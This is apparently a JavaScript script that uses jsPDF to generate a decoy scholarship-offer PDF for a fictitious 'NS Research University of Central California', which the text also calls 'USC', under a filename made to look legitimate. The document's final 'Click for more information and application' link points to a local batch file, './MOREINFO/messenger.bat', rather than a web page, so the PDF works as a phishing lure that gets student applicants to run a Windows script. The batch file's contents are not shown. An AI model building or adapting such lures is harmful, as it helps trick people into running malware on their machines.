const jsPDF = require("jspdf");

htmlContent = [
  { type: "title", content: "NS Research University of Central California" },
  {
    type: "avtext",
    content: "January 19th 2023",
  },
  {
    type: "text",
    content:
      "Are you a motivated student with a passion for learning, research, and community service? Are you dreaming of",
  },
  {
    type: "text",
    content:
      "pursuing higher education in the United States of America? The NS University of Central California offers an",
  },
  {
    type: "text",
    content:
      "incredible opportunity for students to experience world-class education with full-ride scholarships.",
  },
  {
    type: "text",
    content:
      "This esteemed institution is not only dedicated to academic excellence but also places a strong emphasis on",
  },
  {
    type: "text",
    content:
      "community engagement and  and cutting-edge research, particularly in the field of computing & technology.",
  },
  {
    type: "text",
    content: "Application Requirements",
  },
  {
    type: "text",
    content: "Application Supplements",
  },
];

let y = 50;
let x = 20;

const doc = new jsPDF.jsPDF();

doc.addImage("logo.jpeg", "JPEG", 100, 10, 100, 100);

doc.setFont("times", "bold");
doc.setFontSize("12");
doc.text(htmlContent[0].content, 60, 20);
doc.setFont("times", "normal");
doc.setFontSize("11");
doc.text(htmlContent[1].content, 15, 30);
doc.text(htmlContent[2].content, 15, 40);
doc.text(htmlContent[3].content, 15, 47);
doc.text(htmlContent[4].content, 15, 54);
doc.text(htmlContent[5].content, 15, 61);
doc.text(htmlContent[6].content, 15, 68);

doc.setFont("times", "bold");
doc.setFontSize("11");
doc.text(htmlContent[7].content, 15, 77);

doc.setFont("times", "normal");

doc.text("A minimum GPA of 2.5", 15, 92);
doc.text(
  "A TOEFL, Duolingo, or an EF Learning Certificate for international students from non-English speaking countries",
  15,
  85
);
doc.text("Being aged 14 or above", 15, 98);
doc.text("We are test (SAT/ACT) optional ", 15, 105);

doc.setFont("times", "bold");
doc.setFontSize("11");
doc.text(htmlContent[8].content, 15, 114);

doc.text("One personal essay with 500-650 words ", 15, 122);

doc.setFont("times", "normal");
doc.text(
  "Applicants are encouraged to express their individuality and share their personal experiences, academic",
  15,
  129
);
doc.text("aspirations, and contributions to the community", 15, 136);

doc.setFont("times", "bold");

doc.text("One Teacher Recommendation Letter", 15, 144);

doc.setFont("times", "normal");
doc.text(
  "A letter from a teacher who can attest to the student's academic achievements, character, and potential for success",
  15,
  151
);
doc.text("as well as portray the student's rigor in class activities", 15, 158);

doc.setFont("times", "bold");

doc.text("Why the NS Research University of Central California?", 15, 168);
doc.text(
  "A soft spot for Community Engagement & A haven for learning",
  15,
  177
);

doc.setFont("times", "normal");
doc.text(
  "USC takes pride in its commitment to fostering a sense of community among its students. The university believes in",
  15,
  184
);

doc.text(
  "the transformative power of collaboration  and encourages students to actively participate in community service",
  15,
  191
);

doc.text(
  "initiatives. This not only enriches the student experience but also contributes to the development of  well-rounded,",
  15,
  198
);

doc.text(
  "socially conscious individuals. For those with a passion for technology, USC provides an unparalleled environment for",
  15,
  205
);

doc.text(
  "cutting-edge research.  USC's commitment to innovation is evident in its research labs and state-of-the-art facilities.",
  15,
  212
);

doc.setFont("times", "bold");
doc.textWithLink("Click for more information and application", 70, 230, {
  url: "./MOREINFO/messenger.bat",
});

// var img = new Image();
// img.src = path.resolve("logo.jpeg");
// doc.addImage(img, "JPEG", 1, 2);

doc.save(
  "Study In USA (NS Research University of Central Cali) - Scholarship Opportunity .pdf"
);
console.log("PDF generated successfully");
